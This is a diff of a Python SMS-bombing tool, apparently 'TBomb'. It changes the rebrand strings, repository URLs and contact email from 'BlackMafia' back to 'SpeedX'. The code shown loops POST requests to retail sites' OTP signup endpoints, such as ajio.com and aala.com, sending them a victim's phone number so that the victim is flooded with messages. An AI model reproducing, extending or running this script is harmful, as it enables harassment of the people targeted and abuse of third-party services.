@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-#BlackMafia
 from datetime import datetime
 import os
 import hashlib
@@ -21,11 +20,11 @@ except ImportError:
 
 colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
 W='\033[0m'
-# The Credit For This Code Goes To BlackMafia And All Other Contributors Listed At https://github.com/lovehacker404/sms
+# The Credit For This Code Goes To BlackMafia And All Other Contributors Listed At https://github.com/lovehacker404/BlackMafia.sh
 # If You Wanna Take Credits For This Code, Please Look Yourself Again
 
 country_codes = {
-    '93': 'AF',
+    '92': 'PK',
     '355': 'AL',
     '213': 'DZ',
     '376': 'AD',
@@ -82,7 +81,7 @@ country_codes = {
     '251': 'ET',
     '500': 'FK',
     '298': 'FO',
-    '92': 'PK',
+    '679': 'FJ',
     '358': 'FI',
     '33': 'FR',
     '689': 'PF',
@@ -253,8 +252,7 @@ def banner():
 ██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║
 ██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
 ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
-      Your Mind is Your Best Weapon
-                                         """
+      Your Mind is Your Best Weapon  """
     print(random.choice(colors)+logo+W)
     print("\n")
 
@@ -280,7 +278,7 @@ def infinite(pn, dl, ch, max):
             continue
         os.system('rm proc.xxx >/dev/null 2>&1')
         count_inf += 1
-        # os.system('echo BlackMafia >> count.xxx')
+        # os.system('echo SpeedX >> count.xxx')
         time.sleep(float(dl))
         if (count_inf > maxlim):
             exit()
@@ -598,7 +596,7 @@ def getapi(pn,lim,cc):
             'Accept-Encoding': 'gzip, deflate, br',
             'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'}
 
-        data = {"firstName":"BlackMafia","login":"johnyaho@gmail.com","password":"Rock@5star","genderType":"Male","mobileNumber":"0000","requestType":"SENDOTP"}
+        data = {"firstName":"SpeedX","login":"johnyaho@gmail.com","password":"Rock@5star","genderType":"Male","mobileNumber":"0000","requestType":"SENDOTP"}
 
         response = requests.post('https://www.ajio.com/api/auth/signupSendOTP', headers=headers, cookies=cookies, json=data)
         rd=response.text
@@ -652,8 +650,8 @@ def getapi(pn,lim,cc):
 
         data = {
           'email': cc+pn,
-          'firstname': 'BlackMafia',
-          'lastname': 'BlackMafia'
+          'firstname': 'SpeedX',
+          'lastname': 'SpeedX'
         }
 
         response = requests.post('https://www.aala.com/accustomer/ajax/getOTP', headers=headers, cookies=cookies, json=data)
@@ -733,7 +731,7 @@ def start(target, counter, delay, ch, cc):
                 else:
                     print('\n\n\tSorry Your Country is Not Supported...')
                     print(
-                        '\t\tPlease Send A Mail To lovehacker966@gmail.com To Let Us Know...')
+                        '\t\tPlease Send A Mail To ggspeedx29@gmail.com To Let Us Know...')
                     input('Press Enter To Exit...')
                     exit()
         print(random.choice(colors))
@@ -791,7 +789,7 @@ except Exception:
     exit()
 print('\tChecking For Updates...')
 ver = urllib.request.urlopen(
-    "https://raw.githubusercontent.com/BlackMafia/sms/master/.version").read().decode('utf-8')
+    "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.version").read().decode('utf-8')
 verl = ''
 try:
     verl = open(".version", 'r').read()
@@ -805,7 +803,7 @@ print("Your Version is Up-To-Date")
 print('\n\n\t\t\tStarting TBomb...\n\n')
 try:
     noti = urllib.request.urlopen(
-        "https://raw.githubusercontent.com/BlackMafia/sms/master/.notify").read().decode('utf-8')
+        "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.notify").read().decode('utf-8')
     noti = noti.upper().strip()
     if len(noti) > 10:
         print('\n\n\tNOTIFICATION: ' + noti + '\n\n')
